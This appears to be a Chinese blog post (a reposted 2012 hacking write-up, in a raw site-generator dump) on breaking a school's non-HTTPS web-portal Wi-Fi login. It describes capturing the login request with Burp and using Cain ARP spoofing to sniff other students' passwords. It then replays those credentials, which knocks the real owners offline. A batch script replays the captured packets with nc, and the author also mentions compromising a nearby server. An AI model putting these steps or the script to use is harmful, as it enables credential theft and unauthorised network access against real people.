class=\"variable\">%22margin</span>-left<span class=\"variable\">%3A</span>+<span class=\"number\">15</span>px<span class=\"variable\">%3B</span>+margin-right<span class=\"variable\">%3A</span>+<span class=\"number\">15</span>px<span class=\"variable\">%22</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cdiv</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cul</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3E</span><span class=\"variable\">%E5</span><span class=\"variable\">%9C</span><span class=\"variable\">%A8</span><span class=\"variable\">%E8</span><span class=\"variable\">%BF</span><span class=\"variable\">%9B</span><span class=\"variable\">%E8</span><span class=\"variable\">%A1</span><span class=\"variable\">%8CWeb</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E4</span><span class=\"variable\">%B9</span><span class=\"variable\">%8B</span><span class=\"variable\">%E5</span><span class=\"variable\">%89</span><span class=\"variable\">%8D</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E5</span><span class=\"variable\">%BB</span><span class=\"variable\">%BA</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%AE</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%88</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B3</span><span class=\"variable\">%E9</span><span class=\"variable\">%97</span><span class=\"variable\">%AD</span><span class=\"variable\">%E5</span><span class=\"variable\">%90</span><span class=\"variable\">%8E</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%B0</span><span class=\"variable\">%E7</span><span class=\"variable\">%9A</span><span class=\"variable\">%84</span><span class=\"variable\">%E5</span><span class=\"variable\">%BA</span><span class=\"variable\">%94</span><span class=\"variable\">%E7</span><span class=\"variable\">%94</span><span class=\"variable\">%A8</span><span class=\"variable\">%E8</span><span class=\"variable\">%BD</span><span class=\"variable\">%AF</span><span class=\"variable\">%E4</span><span class=\"variable\">%BB</span><span class=\"variable\">%B6</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E5</span><span class=\"variable\">%A6</span><span class=\"variable\">%82FTP</span><span class=\"variable\">%E3</span><span class=\"variable\">%80</span><span class=\"variable\">%81MSN</span><span class=\"variable\">%E7</span><span class=\"variable\">%AD</span><span class=\"variable\">%89</span><span class=\"variable\">%E7</span><span class=\"variable\">%AD</span><span class=\"variable\">%89</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3E</span><span class=\"variable\">%E5</span><span class=\"variable\">%A6</span><span class=\"variable\">%82</span><span class=\"variable\">%E6</span><span class=\"variable\">%9E</span><span class=\"variable\">%9C</span><span class=\"variable\">%E5</span><span class=\"variable\">%87</span><span class=\"variable\">%BA</span><span class=\"variable\">%E7</span><span class=\"variable\">%8E</span><span class=\"variable\">%B0</span><span class=\"variable\">%E6</span><span class=\"variable\">%97</span><span class=\"variable\">%A0</span><span class=\"variable\">%E6</span><span class=\"variable\">%B3</span><span class=\"variable\">%95</span><span class=\"variable\">%E8</span><span class=\"variable\">%BF</span><span class=\"variable\">%9E</span><span class=\"variable\">%E6</span><span class=\"variable\">%8E</span><span class=\"variable\">%A5</span><span class=\"variable\">%E5</span><span class=\"variable\">%88</span><span class=\"variable\">%B0</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E9</span><span class=\"variable\">%A1</span><span class=\"variable\">%B5</span><span class=\"variable\">%E9</span><span class=\"variable\">%9D</span><span class=\"variable\">%A2</span><span class=\"variable\">%E7</span><span class=\"variable\">%9A</span><span class=\"variable\">%84</span><span class=\"variable\">%E6</span><span class=\"variable\">%83</span><span class=\"variable\">%85</span><span class=\"variable\">%E5</span><span class=\"variable\">%86</span><span class=\"variable\">%B5</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E5</span><span class=\"variable\">%BB</span><span class=\"variable\">%BA</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%AE</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%88</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B3</span><span class=\"variable\">%E9</span><span class=\"variable\">%97</span><span class=\"variable\">%AD</span><span class=\"variable\">%E5</span><span class=\"variable\">%90</span><span class=\"variable\">%8E</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%B0</span><span class=\"variable\">%E7</span><span class=\"variable\">%9A</span><span class=\"variable\">%84</span><span class=\"variable\">%E5</span><span class=\"variable\">%BA</span><span class=\"variable\">%94</span><span class=\"variable\">%E7</span><span class=\"variable\">%94</span><span class=\"variable\">%A8</span><span class=\"variable\">%E8</span><span class=\"variable\">%BD</span><span class=\"variable\">%AF</span><span class=\"variable\">%E4</span><span class=\"variable\">%BB</span><span class=\"variable\">%B6</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E5</span><span class=\"variable\">%86</span><span class=\"variable\">%8D</span><span class=\"variable\">%E9</span><span class=\"variable\">%87</span><span class=\"variable\">%8D</span><span class=\"variable\">%E6</span><span class=\"variable\">%96</span><span class=\"variable\">%B0</span><span class=\"variable\">%E6</span><span class=\"variable\">%89</span><span class=\"variable\">%93</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%80</span><span class=\"variable\">%E6</span><span class=\"variable\">%B5</span><span class=\"variable\">%8F</span><span class=\"variable\">%E8</span><span class=\"variable\">%A7</span><span class=\"variable\">%88</span><span class=\"variable\">%E5</span><span class=\"variable\">%99</span><span class=\"variable\">%A8</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3E</span><span class=\"variable\">%E5</span><span class=\"variable\">%A6</span><span class=\"variable\">%82</span><span class=\"variable\">%E6</span><span class=\"variable\">%9E</span><span class=\"variable\">%9C</span><span class=\"variable\">%E8</span><span class=\"variable\">%A6</span><span class=\"variable\">%81</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8B</span><span class=\"variable\">%E7</span><span class=\"variable\">%BA</span><span class=\"variable\">%BF</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%B7</span><span class=\"variable\">%E7</span><span class=\"variable\">%82</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%87</span><span class=\"variable\">%BB</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8B</span><span class=\"variable\">%E7</span><span class=\"variable\">%BA</span><span class=\"variable\">%BF</span><span class=\"variable\">%E6</span><span class=\"variable\">%8C</span><span class=\"variable\">%89</span><span class=\"variable\">%E9</span><span class=\"variable\">%92</span><span class=\"variable\">%AE</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E7</span><span class=\"variable\">%84</span><span class=\"variable\">%B6</span><span class=\"variable\">%E5</span><span class=\"variable\">%90</span><span class=\"variable\">%8E</span><span class=\"variable\">%E5</span><span class=\"variable\">%86</span><span class=\"variable\">%8D</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B3</span><span class=\"variable\">%E9</span><span class=\"variable\">%97</span><span class=\"variable\">%AD</span><span class=\"variable\">%E6</span><span class=\"variable\">%B5</span><span class=\"variable\">%8F</span><span class=\"variable\">%E8</span><span class=\"variable\">%A7</span><span class=\"variable\">%88</span><span class=\"variable\">%E5</span><span class=\"variable\">%99</span><span class=\"variable\">%A8</span><span class=\"variable\">%E7</span><span class=\"variable\">%AA</span><span class=\"variable\">%97</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%A3</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3E</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E6</span><span class=\"variable\">%88</span><span class=\"variable\">%90</span><span class=\"variable\">%E5</span><span class=\"variable\">%8A</span><span class=\"variable\">%9F</span><span class=\"variable\">%E5</span><span class=\"variable\">%90</span><span class=\"variable\">%8E</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E4</span><span class=\"variable\">%BC</span><span class=\"variable\">%9A</span><span class=\"variable\">%E6</span><span class=\"variable\">%9C</span><span class=\"variable\">%89</span><span class=\"variable\">%E6</span><span class=\"variable\">%A0</span><span class=\"variable\">%87</span><span class=\"variable\">%E9</span><span class=\"variable\">%A2</span><span class=\"variable\">%98</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%BA</span><span class=\"variable\">%E2</span><span class=\"variable\">%80</span><span class=\"variable\">%9CWeb</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8B</span><span class=\"variable\">%E7</span><span class=\"variable\">%BA</span><span class=\"variable\">%BF</span><span class=\"variable\">%E9</span><span class=\"variable\">%A1</span><span class=\"variable\">%B5</span><span class=\"variable\">%E9</span><span class=\"variable\">%9D</span><span class=\"variable\">%A2</span>+<span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%B7</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8D</span><span class=\"variable\">%E8</span><span class=\"variable\">%A6</span><span class=\"variable\">%81</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B3</span><span class=\"variable\">%E9</span><span class=\"variable\">%97</span><span class=\"variable\">%AD</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%A5</span><span class=\"variable\">%E9</span><span class=\"variable\">%A1</span><span class=\"variable\">%B5</span><span class=\"variable\">%E9</span><span class=\"variable\">%9D</span><span class=\"variable\">%A2</span><span class=\"variable\">%E2</span><span class=\"variable\">%80</span><span class=\"variable\">%9D</span><span class=\"variable\">%E7</span><span class=\"variable\">%9A</span><span class=\"variable\">%84</span><span class=\"variable\">%E7</span><span class=\"variable\">%AA</span><span class=\"variable\">%97</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%A3</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%87</span><span class=\"variable\">%BA</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%B0</span><span class=\"variable\">%E5</span><span class=\"variable\">%BD</span><span class=\"variable\">%95</span><span class=\"variable\">%E6</span><span class=\"variable\">%82</span><span class=\"variable\">%A8</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8A</span><span class=\"variable\">%E7</span><span class=\"variable\">%BD</span><span class=\"variable\">%91</span><span class=\"variable\">%E7</span><span class=\"variable\">%9A</span><span class=\"variable\">%84</span><span class=\"variable\">%E4</span><span class=\"variable\">%BF</span><span class=\"variable\">%A1</span><span class=\"variable\">%E6</span><span class=\"variable\">%81</span><span class=\"variable\">%AF</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%9B</span><span class=\"variable\">%E5</span><span class=\"variable\">%A6</span><span class=\"variable\">%82</span><span class=\"variable\">%E6</span><span class=\"variable\">%9E</span><span class=\"variable\">%9C</span><span class=\"variable\">%E6</span><span class=\"variable\">%B2</span><span class=\"variable\">%A1</span><span class=\"variable\">%E6</span><span class=\"variable\">%9C</span><span class=\"variable\">%89</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%87</span><span class=\"variable\">%BA</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%B7</span><span class=\"variable\">%E6</span><span class=\"variable\">%A3</span><span class=\"variable\">%80</span><span class=\"variable\">%E6</span><span class=\"variable\">%9F</span><span class=\"variable\">%A5</span><span class=\"variable\">%E6</span><span class=\"variable\">%B5</span><span class=\"variable\">%8F</span><span class=\"variable\">%E8</span><span class=\"variable\">%A7</span><span class=\"variable\">%88</span><span class=\"variable\">%E5</span><span class=\"variable\">%99</span><span class=\"variable\">%A8</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%BE</span><span class=\"variable\">%E7</span><span class=\"variable\">%BD</span><span class=\"variable\">%AE</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B3</span><span class=\"variable\">%E9</span><span class=\"variable\">%97</span><span class=\"variable\">%AD</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%87</span><span class=\"variable\">%BA</span><span class=\"variable\">%E7</span><span class=\"variable\">%AA</span><span class=\"variable\">%97</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%A3</span><span class=\"variable\">%E6</span><span class=\"variable\">%8B</span><span class=\"variable\">%A6</span><span class=\"variable\">%E6</span><span class=\"variable\">%88</span><span class=\"variable\">%AA</span><span class=\"variable\">%E5</span><span class=\"variable\">%B7</span><span class=\"variable\">%A5</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%B7</span><span class=\"variable\">%E3</span><span class=\"variable\">%80</span><span class=\"variable\">%82</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Ful</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fdiv</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cul</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3EBefore</span>+carrying+out+Web+authentication+is+recommended+that+you+turn+off+background+applications<span class=\"variable\">%2C</span>+such+as+FTP<span class=\"variable\">%2C</span>+MSN<span class=\"variable\">%2C</span>+etc.<span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3EIf</span>+unable+to+<span class=\"keyword\">connect</span>+to+the+authentication+page<span class=\"variable\">%2C</span>+it+is+recommended+to+<span class=\"keyword\">close</span>+the+back-end+application+software<span class=\"variable\">%2C</span>+<span class=\"keyword\">and</span>+then+re-<span class=\"keyword\">open</span>+the+browser.<span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3EIf</span>+you+want+offline<span class=\"variable\">%2C</span>+please+click+the+offline+button<span class=\"variable\">%2C</span>+<span class=\"keyword\">and</span>+then+<span class=\"keyword\">close</span>+the+browser+window.<span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span>++++<span class=\"variable\">%3Cli</span><span class=\"variable\">%3EAuthentication</span>+is+successful<span class=\"variable\">%2C</span>+there+will+be+titled+<span class=\"variable\">%22Web</span>+authentication+page+off+the+assembly+line<span class=\"variable\">%2C</span>+<span class=\"keyword\">do</span>+<span class=\"keyword\">not</span>+<span class=\"keyword\">close</span>+the+page<span class=\"variable\">%22</span>+window+pops+up<span class=\"variable\">%2C</span>+record+your+Internet+access+information<span class=\"variable\">%3B</span>+If+there+are+<span class=\"keyword\">no</span>+<span class=\"keyword\">pop</span>-up<span class=\"variable\">%2C</span>+please+check+your+browser+settings<span class=\"variable\">%2C</span>+<span class=\"keyword\">close</span>+the+<span class=\"keyword\">pop</span>-up+blocker+tool.<span class=\"variable\">%3C</span><span class=\"variable\">%2Fli</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Ful</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fdiv</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cp</span><span class=\"variable\">%3E</span><span class=\"variable\">%C2</span><span class=\"variable\">%A0</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fp</span><span class=\"variable\">%3E</span></span></div></pre></td></tr></table></figure>\n\n<p>按照打探得的消息，整个数据包有用的参数只有mac、username、usernameHidden、pwd，其他的大致都是与无线路由什么的有关。最后那段</p>\n<p>长长的参数是url编码的数据，在成功联网后还蛋疼的decode了下，反正不是什么重要的信息。</p>\n<p>准备工作做好了，那就开嗅吧。</p>\n<p>因为尝试多次发现usernameHidden与username的值是相等的，且mac的值可以在嗅探器的url一栏里看到，所以打开cain，找到HTTP Fields，</p>\n<p>在username field里只留下username，password field里只留下pwd。在cain中调到arp欺骗这一项，选几个顺眼的ip，开始等密码。不一会就得</p>\n<p>到了好几组密码。</p>\n<p>最开始以为无线网卡的mac地址必须改成与账号所对应的mac一样，但是苦于抓到包的参数中mac一项是经过加密的，貌似是MD5加密。但是拿着</p>\n<p>自己的mac，猜了几种不同的形式，本地计算MD5，但都与数据包中的值不同。后来想了想，即使我猜对了mac的形式，我也不可能逆出mac啊…</p>\n<p>没办法，硬着头皮把自己包中的mac、username、usernameHidden、pwd修改成嗅探得到的用户名密码以及mac部分的值，用brup发出去。</p>\n<p>上百度测试一下，唔，成功连上了~</p>\n<p>嗅探真是一个可怕的东东啊~</p>\n<p>按照原理的话，对于web验证的wifi，只要登陆页面不是https加密的，我们就可以用这种方法进行突破，用其他人的账户密码上网。</p>\n<p>总结：</p>\n<p>首先本地抓包查找数据包中的有用以及必要的信息，接下来嗅探得可以进行授权认证的信息，最后修改数据包发送至服务器完成验证。</p>\n<p>后记：</p>\n<p>实际中发现，这个验证不能用于多个人。即我蹭网之后，原主人的网就掉了。没办法，我只能抓了好几个人的密码之后挨个试了，希望原主人正好</p>\n<p>离开~</p>\n<p>嫌麻烦，写了个批处理，用nc发包。附上代码：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"keyword\">echo</span> off</div><div class=\"line\">Title Wifi蹭网 by delete</div><div class=\"line\"><span class=\"keyword\">echo</span> *******************************************************************************</div><div class=\"line\"><span class=\"keyword\">echo</span> Wifi蹭网免验证 by delete</div><div class=\"line\"><span class=\"keyword\">echo</span> *******************************************************************************</div><div class=\"line\"><span class=\"keyword\">echo</span> 请从以下学号中选择一个：</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">1</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">2</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">3</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">4</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">5</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">6</span>\\. Xxxxxx</div><div class=\"line\"><span class=\"keyword\">set</span> choice=</div><div class=\"line\"><span class=\"keyword\">set</span> /p choice=请选择:</div><div class=\"line\"><span class=\"flow\">if</span> <span class=\"flow\">not</span> &quot;<span class=\"envvar\">%Choice%</span>&quot;==&quot;&quot; <span class=\"keyword\">set</span> Choice=<span class=\"envvar\">%Choice:~0,1%</span></div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">1</span>&quot; <span class=\"flow\">goto</span> st1</div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">2</span>&quot; <span class=\"flow\">goto</span> st2</div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">3</span>&quot; <span class=\"flow\">goto</span> st3</div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">4</span>&quot; <span class=\"flow\">goto</span> st4</div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">5</span>&quot; <span class=\"flow\">goto</span> st5</div><div class=\"line\"><span class=\"flow\">if</span> /i &quot;<span class=\"envvar\">%choice%</span>&quot;==&quot;<span class=\"number\">6</span>&quot; <span class=\"flow\">goto</span> st6</div><div class=\"line\"></div><div class=\"line\">:st1</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st1.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\">:st2</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st2.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\">:st3</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st3.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\">:st4</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st4.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\">:st5</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st5.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\">:st6</div><div class=\"line\">nc -n xx.xx.xx.xx <span class=\"number\">80</span> &lt; ./data/st6.txt</div><div class=\"line\"><span class=\"flow\">goto</span> end</div><div class=\"line\"></div><div class=\"line\">:end</div></pre></td></tr></table></figure>\n\n<p>用法是将nc.exe放在该bat脚本同一目录下，并新建data文件夹，存放有不同账户对应的数据包的信息的txt文件。具体的命名什么的看一下脚本就懂了。</p>\n<p>有个bug是运行到调用nc时，会卡在nc提交数据包得到返回的界面，不能自动结束。运行前还要先随便打开一个网页，以完成本机参数初始化…</p>\n<p>再后来，日下了与验证网页所在服务器同网段的一台服务器，装上cain怎么嗅都嗅不到，甚是郁闷。Arp欺骗那里显示half routing，没有一个full</p>\n<p>routing。而嗅探其他的服务器却不是这样的。莫非装了牛b的防火墙？求大牛解答~</p>\n<p>还有一个更奇葩的问题，几天之后，当我再次想嗅探一下来获得更多的用户名密码的时候，开cain嗅探居然进行arp欺骗的时候劫持不到数据包，有</p>\n<p>点想不通了。<br>最后废话一句，很多学校都已经支持ipv6了，我当前测试的无线路由是支持ipv6的。而登陆验证只限于ipv4，这样其实直接就能上ipv6的网的。网</p>\n<p>上有很多ipv6转ipv4的方法，其中一个是sixxs.org，我个人觉得最好的是Veno2这个软件。有机会有条件的话大家不妨百度下具体的方法试试~</p>\n","source":"_posts/非https协议web方式wifi认证突破.md","raw":"title: \"非https协议web方式wifi认证突破\"\nid: 184\ndate: 2012-07-31 10:43:41\ntags: \n- cain\n- web wifi认证\n- 嗅探\ncategories: \n- 技术文章\n---\n\n转自：法客 deleter\n\n话说我是个游手好闲的人，趁着暑假四处游荡，投亲靠友。一日来到某校，看有wifi，如饥似渴的打算蹭个小网上上。做好字典破wpa，暴力破\n\nwep的准备了都，连上wifi就傻眼了，web认证…\n\n好吧，web认证。既然是web认证，少不了负责验证的服务器。经测试，随便输入一个网址后都会被重定向到A站的一个登陆页面。如果能做手\n\n脚的话只能在这个页面上搞了。\n\nknow it then hack it。首先找到知情人士，得知开网要提前申请，并且此账户与mac绑定。这就给了我当头一棒。本来想着肯定有很多人密码\n\n和用户名是一样的，而用户名又是学号，这样写个脚本暴力破解一个一个猜过去就行了。这样的话仅靠猜弱口令来登陆的话是不可能了。\n\n既然输入网址能被重定向到一个页面，而且此页面所在的服务器是一个公网的ip，那么说，我肯定已经分配好ip了，仅差一个授权。\n\n既然我已经有了一个ip，我就可以对所在的网段进行嗅探，如果能嗅探到登陆信息说不定还有点门路呢。\n\n有了大致的思路，开工开工~\n\n<!--more-->\n\n首先开brup抓本地包。在登陆页面随便输入一个用户名和密码，被brup拦下。数据包内容如下：\n\n```shell\nPOST /eportal/webgateuser.do?method=login_ajax_s26_in_out HTTP/1.1\nHost: x.x.x.x\nProxy-Connection: keep-alive\nContent-Length: 3864\nCache-Control: max-age=0\nOrigin: http://ooxx\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: zh-CN,zh;q=0.8\nAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3\nCookie: EPORTAL_COOKIE_USERNAME=3530393031323137; EPORTAL_COOKIE_PASSWORD=3530393031323137; JSESSIONID=77E5D178759BD74801C9FAF8D4B4933F\n\ns=69c73394ffea3cc2453dfd4cff2af4a5&amp;t=wireless&amp;ssid=ad3c77575724aefa351ab6744a2a38a0&amp;apmac=6db3d4ac6fdf391878c2635b7bc531fb&amp;mac=56053fdf38ba0a3ba46ad1428f46fe61&amp;port=f8821b8335bb27ee&amp;url=f58cd7a67bbfecbcf3027f3e4bf7b380fb7aa95efe039033&amp;vid=&amp;net_access_type=internet&amp;username=deleter&amp;usernameHidden=deleter&amp;pwd=deleter&amp;seczone=&amp;validcode=no_check&amp;tipinfoHidden=%3Cdiv+style%3D%22border-right%3A+%23ddd476+1px+solid%3B+padding-right%3A+10px%3B+border-top%3A+%23ddd476+1px+solid%3B+padding-left%3A+10px%3B+padding-bottom%3A+10px%3B+border-left%3A+%23ddd476+1px+solid%3B+padding-top%3A+10px%3B+border-bottom%3A+%23ddd476+1px+solid%3B+height%3A+90px%3B+background-color%3A+%23fdfadd%3B+text-align%3A+left%22%3E%0D%0A%3Cp+style%3D%22text-align%3A+center%22%3E%3Cspan+style%3D%22font-weight%3A+bold%3B+font-size%3A+12px%3B+color%3A+%23daa517%3B+line-height%3A+20px%22%3E%E4%B8%8A%E7%BD%91%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%9A%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%3Cp+style%3D%22color%3A+%2302ae0a%3B+line-height%3A+17px%3B+text-align%3A+center%22%3E%E5%85%81%E8%AE%B8Web%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E5%8F%AF%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E6%9C%AC%E